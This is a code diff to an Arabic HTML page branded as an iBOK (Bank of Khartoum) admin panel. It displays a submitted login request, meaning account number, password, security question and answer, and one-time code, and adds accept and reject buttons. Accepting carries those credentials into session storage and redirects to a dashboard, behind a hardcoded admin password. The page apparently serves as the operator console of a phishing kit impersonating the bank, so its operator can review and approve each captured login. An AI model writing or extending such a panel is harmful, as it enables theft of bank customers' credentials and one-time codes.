@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iBOK - لوحة التحكم</title>
+    <title>iBOK - لوحة الإدارة</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
@@ -99,11 +99,18 @@
             align-items: center;
             gap: 6px;
         }
-        .btn-logout {
+        .btn-accept {
+            background: #28a745;
+            color: white;
+        }
+        .btn-accept:hover {
+            background: #1e7e34;
+        }
+        .btn-reject {
             background: #e63946;
             color: white;
         }
-        .btn-logout:hover {
+        .btn-reject:hover {
             background: #c1121f;
         }
         .btn-back {
@@ -141,12 +148,12 @@
 <body>
     <div class="admin-container">
         <div class="admin-header">
-            <h1><i class="fas fa-user-cog"></i> لوحة تحكم الإدارة</h1>
+            <h1><i class="fas fa-user-cog"></i> لوحة الإدارة</h1>
         </div>
         <div class="admin-body">
-            <div class="welcome"><i class="fas fa-database"></i> البيانات المدخلة</div>
+            <div class="welcome"><i class="fas fa-clipboard-list"></i> طلب تسجيل دخول جديد</div>
 
-            <!-- سيتم ملء البيانات بواسطة JavaScript -->
+            <!-- عرض البيانات -->
             <div id="dataContainer">
                 <table class="data-table">
                     <tr><th>رقم الحساب</th><td id="adminAccount">-</td></tr>
@@ -157,8 +164,10 @@
                 </table>
             </div>
 
+            <!-- أزرار القبول والرفض -->
             <div class="admin-actions">
-                <button class="btn-logout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</button>
+                <button class="btn-accept" onclick="acceptRequest()"><i class="fas fa-check"></i> قبول</button>
+                <button class="btn-reject" onclick="rejectRequest()"><i class="fas fa-times"></i> رفض</button>
                 <button class="btn-back" onclick="goBack()"><i class="fas fa-arrow-right"></i> العودة</button>
             </div>
             <div class="footer-note">© 2025 iBOK | بنك الخرطوم</div>
@@ -170,38 +179,26 @@
         // 🔐 حماية صفحة الإدارة بكلمة مرور
         // ============================================================
         (function adminAuth() {
-            // كلمة المرور المطلوبة للدخول (غير قابلة للتغيير من هنا)
             const ADMIN_PASSWORD = 'snox_admin_2025';
-
-            // التحقق من وجود جلسة مصادقة مسبقة (لتجنب طلب كلمة المرور كل مرة)
             const sessionValid = sessionStorage.getItem('admin_authenticated');
 
             if (!sessionValid || sessionValid !== 'true') {
-                // طلب كلمة المرور من المستخدم
-                const userPass = prompt('🔐 أدخل كلمة مرور المدير للوصول إلى لوحة التحكم:');
-
+                const userPass = prompt('🔐 أدخل كلمة مرور المدير للوصول إلى لوحة الإدارة:');
                 if (userPass === null) {
-                    // المستخدم ضغط على "إلغاء" → نعيده للصفحة الرئيسية
                     window.location.href = 'index.html';
                     return;
                 }
-
                 if (userPass !== ADMIN_PASSWORD) {
-                    alert('❌ كلمة مرور غير صحيحة! سيتم إعادة توجيهك إلى الصفحة الرئيسية.');
+                    alert('❌ كلمة مرور غير صحيحة!');
                     window.location.href = 'index.html';
                     return;
                 }
-
-                // ✅ كلمة المرور صحيحة → تخزين جلسة المصادقة
                 sessionStorage.setItem('admin_authenticated', 'true');
             }
-
-            // إذا وصلنا到这里، فهذا يعني أن المستخدم مصرح له بالدخول
-            // نواصل تحميل البيانات...
         })();
 
         // ============================================================
-        // 📊 تحميل البيانات من localStorage وعرضها
+        // 📊 تحميل البيانات وعرضها
         // ============================================================
         function loadAdminData() {
             const account = localStorage.getItem('admin_account') || '-';
@@ -218,14 +215,72 @@
         }
 
         // ============================================================
-        // 🔄 تسجيل الخروج (مسح البيانات وإنهاء الجلسة)
+        // ✅ قبول الطلب → تحويل المستخدم إلى لوحة التحكم الرئيسية
         // ============================================================
-        function logout() {
-            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-                localStorage.clear();
-                sessionStorage.removeItem('admin_authenticated');
-                window.location.href = 'index.html';
+        function acceptRequest() {
+            // التحقق من وجود بيانات
+            const hasData = localStorage.getItem('admin_account');
+            if (!hasData) {
+                alert('⚠️ لا توجد بيانات للموافقة عليها!');
+                return;
             }
+
+            // تخزين حالة القبول في sessionStorage (للمستخدم)
+            sessionStorage.setItem('user_approved', 'true');
+
+            // عرض رسالة تأكيد
+            const confirmMsg = confirm('✅ هل أنت متأكد من قبول طلب تسجيل الدخول هذا؟\nسيتم تحويل المستخدم إلى لوحة التحكم.');
+            if (!confirmMsg) return;
+
+            // إعلام المستخدم بالقبول ثم تحويله إلى لوحة التحكم
+            alert('✅ تم قبول الطلب بنجاح. جاري تحويل المستخدم إلى لوحة التحكم...');
+
+            // مسح بيانات الإدارة (لأن الطلب انتهى)
+            // لكن نحتفظ ببيانات المستخدم لاستخدامها في لوحة التحكم
+            // يمكن نقلها إلى sessionStorage بدلاً من localStorage
+            const userData = {
+                account: localStorage.getItem('admin_account'),
+                password: localStorage.getItem('admin_password'),
+                question: localStorage.getItem('admin_question'),
+                answer: localStorage.getItem('admin_answer'),
+                otp: localStorage.getItem('admin_otp')
+            };
+
+            // تخزين في sessionStorage للاستخدام في لوحة التحكم
+            sessionStorage.setItem('approved_user_account', userData.account);
+            sessionStorage.setItem('approved_user_password', userData.password);
+            sessionStorage.setItem('approved_user_question', userData.question);
+            sessionStorage.setItem('approved_user_answer', userData.answer);
+            sessionStorage.setItem('approved_user_otp', userData.otp);
+
+            // مسح localStorage المؤقت
+            localStorage.clear();
+
+            // التوجيه إلى لوحة التحكم الرئيسية (dashboard)
+            window.location.href = 'dashboard.html';
+        }
+
+        // ============================================================
+        // ❌ رفض الطلب → العودة إلى تسجيل الدخول مع رسالة
+        // ============================================================
+        function rejectRequest() {
+            const hasData = localStorage.getItem('admin_account');
+            if (!hasData) {
+                alert('⚠️ لا توجد بيانات لرفضها!');
+                return;
+            }
+
+            const confirmMsg = confirm('❌ هل أنت متأكد من رفض طلب تسجيل الدخول هذا؟');
+            if (!confirmMsg) return;
+
+            alert('❌ تم رفض الطلب. سيتم إعادة توجيه المستخدم إلى صفحة تسجيل الدخول.');
+
+            // مسح جميع البيانات
+            localStorage.clear();
+            sessionStorage.removeItem('admin_authenticated');
+
+            // التوجيه إلى صفحة تسجيل الدخول مع رسالة رفض (عن طريق الـ URL)
+            window.location.href = 'index.html?status=rejected';
         }
 
         // ============================================================
@@ -236,7 +291,7 @@
         }
 
         // ============================================================
-        // 🚀 تحميل الصفحة والتحقق من وجود بيانات
+        // 🚀 تحميل الصفحة
         // ============================================================
         window.onload = function() {
             const hasData = localStorage.getItem('admin_account');
@@ -244,9 +299,12 @@
                 document.getElementById('dataContainer').innerHTML = `
                     <div class="empty-state">
                         <i class="fas fa-exclamation-circle"></i>
-                        <p>لا توجد بيانات لعرضها. يرجى تسجيل الدخول أولاً.</p>
+                        <p>لا توجد طلبات معلقة لعرضها.</p>
                     </div>
                 `;
+                // تعطيل الأزرار إذا لم توجد بيانات
+                document.querySelector('.btn-accept').style.display = 'none';
+                document.querySelector('.btn-reject').style.display = 'none';
             } else {
                 loadAdminData();
             }
